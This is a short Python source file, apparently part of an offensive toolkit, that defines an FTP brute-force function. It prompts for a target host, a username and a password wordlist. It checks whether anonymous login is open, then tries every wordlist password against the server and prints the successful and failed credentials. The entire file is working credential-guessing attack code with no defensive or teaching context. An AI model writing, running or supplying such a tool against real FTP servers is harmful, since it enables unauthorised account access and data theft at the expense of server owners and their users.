#coding: utf-8
#!/usr/bin/python3

from mind.modules.main_packages import *

def ftp_brute():
	target = input('Enter IP or domain: ')
	user = input('Enter USERNAME: ')
	passwordW = input('Enter PASSWORD wordlist: ')

	ftp = FTP(target)
	print()
	answers = {"230 'anonymous@' login ok.", '230 Anonymous access granted, restrictions apply', '230 Login successfull.', 'Guest login ok, access restrictions apply.', 'User anonymous logged in.'}

	try:
		if ftp.login() in answers or ftp.login() == '230' or ftp.login().startswith('230'):
			print(bold(good('Anonymous login is open.')))
			print(bold(good('Username: anonymous')))
			print(bold(good('Password: anonymous@')))
			print()
	except:
		pass
	ftp.close()

	passwords = open(passwordW, 'r')

	ftp = FTP(target)

	for password in passwords:
		try:
			if ftp.login(user, password.strip()):
				print(bold(good('Success.')))
				print(bold(good('Username: ' + user)))
				print(bold(good('Password: ' + password)))
		except ftplib.error_perm:
				print(bold(bad('Failed.')))
				print(bold(bad('Username failed: ' + user)))
				print(bold(bad('Password failed: ' + password)))
		except Exception:
			pass
	ftp.close()